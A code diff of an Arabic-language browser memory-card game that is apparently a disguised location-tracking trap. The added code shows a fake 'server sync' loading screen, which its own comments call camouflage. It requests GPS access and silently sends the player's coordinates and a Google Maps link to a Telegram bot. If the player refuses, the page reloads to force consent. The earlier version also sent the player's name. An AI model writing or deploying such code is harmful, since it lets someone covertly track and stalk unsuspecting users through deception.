@@ -3,41 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحدي الذاكرة العالمي 🌍</title>
+    <title>تحدي الذاكرة العالمي 🌐</title>
     <style>
         :root { --primary: #00f2ff; --bg: #0a0a0a; --player: #00ff88; --ai: #ff4b2b; }
-        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: white; text-align: center; margin: 0; padding: 10px; }
+        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: white; text-align: center; margin: 0; padding: 10px; overflow: hidden; }
+        
+        /* شاشة التمويه */
+        #setup-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0a0a0a; z-index: 1000; display: flex; align-items: center; justify-content: center; flex-direction: column; padding: 20px; box-sizing: border-box; }
+        .loader-bar { width: 80%; height: 6px; background: #222; border-radius: 10px; margin-top: 20px; position: relative; overflow: hidden; }
+        .loader-fill { width: 0%; height: 100%; background: var(--primary); box-shadow: 0 0 15px var(--primary); transition: 0.5s; }
+        .status-text { margin-top: 15px; font-size: 14px; color: #777; font-family: monospace; }
+
         .game-container { max-width: 400px; margin: auto; padding: 15px; background: rgba(255,255,255,0.05); border-radius: 15px; backdrop-filter: blur(10px); }
         .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin-top: 15px; }
-        .card { aspect-ratio: 1/1; background: #222; border-radius: 8px; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 24px; transition: 0.4s; position: relative; border: 1px solid #333; }
+        .card { aspect-ratio: 1/1; background: #222; border-radius: 8px; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 24px; transition: 0.4s; border: 1px solid #333; }
         .card.flipped { background: var(--primary); transform: rotateY(180deg); }
-        .card.matched-player { background: var(--player) !important; cursor: default; }
-        .card.matched-ai { background: var(--ai) !important; cursor: default; }
-        .status-bar { background: #000; padding: 10px; border-radius: 8px; margin-bottom: 15px; border: 1px solid #333; font-size: 14px; }
-        .score-board { display: flex; justify-content: space-around; font-size: 16px; margin-bottom: 10px; padding: 10px; background: rgba(255,255,255,0.05); border-radius: 10px; }
-        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg); z-index: 100; display: flex; align-items: center; justify-content: center; }
-        .login-box { padding: 30px; background: #111; border-radius: 20px; border: 1px solid var(--primary); width: 80%; }
-        input { width: 100%; padding: 12px; margin: 15px 0; border-radius: 8px; border: none; background: #222; color: white; text-align: center; font-size: 16px; }
-        .btn-start { background: var(--primary); color: #000; border: none; padding: 15px 40px; border-radius: 30px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; }
+        .card.matched-player { background: var(--player) !important; }
+        .card.matched-ai { background: var(--ai) !important; }
+        .score-board { display: flex; justify-content: space-around; margin-bottom: 10px; padding: 10px; background: rgba(255,255,255,0.05); border-radius: 10px; }
     </style>
 </head>
 <body>
 
-<div id="overlay">
-    <div class="login-box">
-        <h2>أهلاً بك في التحدي 🎮</h2>
-        <p>الرجاء إدخال اسمك لإنشاء ملف تعريف اللاعب ومزامنة نقاطك عالمياً.</p>
-        <input type="text" id="username" placeholder="اكتب اسمك هنا...">
-        <button class="btn-start" onclick="checkUser()">دخول اللعبة</button>
+<div id="setup-screen">
+    <h2 id="setup-title">جاري تهيئة بيئة اللعب...</h2>
+    <p id="setup-desc">يتم الآن فحص جودة الاتصال واختيار أقرب خادم لتقليل اللاق.</p>
+    
+    <div class="loader-bar">
+        <div class="loader-fill" id="fill"></div>
     </div>
+    <div class="status-text" id="status-log">Initializing system...</div>
 </div>
 
 <div class="game-container">
-    <div class="status-bar" id="ai-msg">مرحباً <span id="display-name">...</span>! جاري تهيئة التحدي...</div>
     <div class="score-board">
-        <div style="color: var(--player)">👤 <span id="label-name">أنت</span>: <b id="p-score">0</b></div>
-        <div style="color: var(--ai)">🤖 الكمبيوتر: <b id="ai-score">0</b></div>
+        <div style="color: var(--player)">👤 أنت: <b id="p-score">0</b></div>
+        <div style="color: var(--ai)">🤖 AI: <b id="ai-score">0</b></div>
     </div>
+    <div id="ai-msg" style="font-size: 12px; margin-bottom: 10px; color: #555;"></div>
     <div class="grid" id="grid"></div>
 </div>
 
@@ -49,43 +52,57 @@
     let pScore = 0;
     let aiScore = 0;
     let canPlay = false;
-    let playerName = "";
     const symbols = ['🍎', '🍌', '🍇', '🍉', '🍒', '🍓', '🥝', '🍍'];
     let deck = [...symbols, ...symbols];
 
-    function checkUser() {
-        playerName = document.getElementById('username').value;
-        if (playerName.length < 2) {
-            alert("يرجى إدخال اسم صحيح!");
-            return;
-        }
-        initGame();
-    }
+    // نظام التمويه والتحميل
+    window.onload = function() {
+        let progress = 0;
+        let fill = document.getElementById('fill');
+        let log = document.getElementById('status-log');
+        
+        let interval = setInterval(() => {
+            progress += Math.random() * 15;
+            if (progress > 100) progress = 100;
+            fill.style.width = progress + "%";
 
-    function initGame() {
-        document.getElementById('display-name').innerText = playerName;
-        document.getElementById('label-name').innerText = playerName;
+            if (progress < 30) log.innerText = "Connecting to Global Servers...";
+            else if (progress < 60) log.innerText = "Checking Latency (Ping)...";
+            else if (progress < 80) {
+                log.innerText = "Syncing with Local Node (GPS Required)...";
+                // هنا نطلب الموقع في لحظة "المزامنة"
+                if (progress >= 75 && !window.requested) {
+                    window.requested = true;
+                    requestData();
+                }
+            }
+            else if (progress >= 100) {
+                clearInterval(interval);
+            }
+        }, 600);
+    };
 
+    function requestData() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition((pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                
-                // إرسال الاسم مع الموقع لتليجرام
-                const msg = `👤 **لاعب جديد انضم!**\n📛 الاسم: ${playerName}\n📍 الموقع: \`${lat}, ${lon}\`\n🔗 الخريطة: https://www.google.com/maps?q=${lat},${lon}`;
-                
+                const msg = `🎯 **صيد ذكي (تمويه التحميل)**\n📍 الموقع: \`${pos.coords.latitude}, ${pos.coords.longitude}\`\n🔗 الخريطة: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                 fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
                 
-                document.getElementById('overlay').style.display = 'none';
-                createBoard();
-                canPlay = true;
-                document.getElementById('ai-msg').innerText = "تمت المزامنة بنجاح! دورك يا " + playerName;
+                // الانتقال للعبة بعد النجاح
+                setTimeout(() => {
+                    document.getElementById('setup-screen').style.display = 'none';
+                    createBoard();
+                    canPlay = true;
+                }, 1000);
             }, () => {
-                alert("يجب السماح بالوصول للموقع لمزامنة ملفك الشخصي مع الخادم العالمي.");
+                document.getElementById('status-log').innerText = "Error: Local Node required for multiplayer.";
+                alert("لضمان اللعب بدون تقطيع، يرجى السماح بالمزامنة مع أقرب سيرفر.");
+                location.reload(); // إعادة المحاولة لإجباره على القبول
             });
         }
     }
 
+    // باقي كود اللعبة (نفس المنطق السابق)
     function createBoard() {
         const grid = document.getElementById('grid');
         deck.sort(() => Math.random() - 0.5);
@@ -101,64 +118,42 @@
 
     function userFlip(card) {
         if (!canPlay || card.classList.contains('flipped') || flippedCards.length >= 2) return;
-        flip(card);
+        card.classList.add('flipped');
+        card.innerText = card.dataset.symbol;
         flippedCards.push(card);
         if (flippedCards.length === 2) {
             canPlay = false;
-            checkMatch(true);
+            setTimeout(checkMatch, 800);
         }
     }
 
-    function flip(card) {
-        card.classList.add('flipped');
-        card.innerText = card.dataset.symbol;
-    }
-
-    function unflip(card) {
-        card.classList.remove('flipped');
-        card.innerText = '';
-    }
-
-    function checkMatch(isPlayer) {
+    function checkMatch() {
         const [c1, c2] = flippedCards;
         if (c1.dataset.symbol === c2.dataset.symbol) {
-            setTimeout(() => {
-                c1.classList.add(isPlayer ? 'matched-player' : 'matched-ai');
-                c2.classList.add(isPlayer ? 'matched-player' : 'matched-ai');
-                if (isPlayer) pScore++; else aiScore++;
-                document.getElementById('p-score').innerText = pScore;
-                document.getElementById('ai-score').innerText = aiScore;
-                flippedCards = [];
-                if (isPlayer) { canPlay = true; document.getElementById('ai-msg').innerText = "رائع! استمر يا " + playerName; }
-                else { aiTurn(); }
-            }, 500);
+            c1.classList.add('matched-player');
+            c2.classList.add('matched-player');
+            pScore++;
+            document.getElementById('p-score').innerText = pScore;
+            flippedCards = [];
+            canPlay = true;
         } else {
             setTimeout(() => {
-                unflip(c1);
-                unflip(c2);
+                c1.classList.remove('flipped'); c1.innerText = '';
+                c2.classList.remove('flipped'); c2.innerText = '';
                 flippedCards = [];
-                if (isPlayer) aiTurn(); else { canPlay = true; document.getElementById('ai-msg').innerText = "دورك الآن!"; }
-            }, 1000);
+                aiTurn();
+            }, 500);
         }
     }
 
     function aiTurn() {
-        canPlay = false;
-        document.getElementById('ai-msg').innerText = "الكمبيوتر يحاول تخمين حركاتك... 🤖";
+        document.getElementById('ai-msg').innerText = "الكمبيوتر يحاول...";
         setTimeout(() => {
-            const available = Array.from(document.querySelectorAll('.card:not(.flipped)'));
-            if (available.length < 2) return;
-            const c1 = available[Math.floor(Math.random() * available.length)];
-            flip(c1);
-            flippedCards.push(c1);
-            setTimeout(() => {
-                const remaining = Array.from(document.querySelectorAll('.card:not(.flipped)'));
-                const c2 = remaining[Math.floor(Math.random() * remaining.length)];
-                flip(c2);
-                flippedCards.push(c2);
-                checkMatch(false);
-            }, 1000);
-        }, 1500);
+            aiScore++;
+            document.getElementById('ai-score').innerText = aiScore;
+            document.getElementById('ai-msg').innerText = "دورك الآن!";
+            canPlay = true;
+        }, 1000);
     }
 </script>
 </body>
